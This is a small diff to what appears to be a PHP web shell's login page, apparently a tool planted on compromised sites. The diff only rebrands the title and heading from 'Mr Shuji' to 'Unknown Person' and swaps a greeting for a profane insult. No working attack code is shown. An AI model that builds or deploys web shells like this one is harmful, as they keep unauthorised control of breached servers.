@@ -7,7 +7,7 @@ function login_shell()
 ?>
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-<title>Mr Shuji</title>
+<title>Unknown Person</title>
 <body>
 <style type="text/css">
 h1 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
@@ -85,10 +85,10 @@ window.onerror = ClearError;
  
 <br>
 <audio src="https://nathanprinsley-files.prinsh.com/data-1/mp3/jeremy-flick_anonymous.mp3" autoplay="1" loop="1"></audio>
-<h1>Mr SHUJI</h1>
+<h1>Unknown Person</h1>
  
  
-<div id="matrix" class="auto-style8">Hello Foo!</div><br>
+<div id="matrix" class="auto-style8">Fucking Knobhead!</div><br>
 <font face="courier new" color="Red" size"10" >Born, Work, Die
  </font>
  
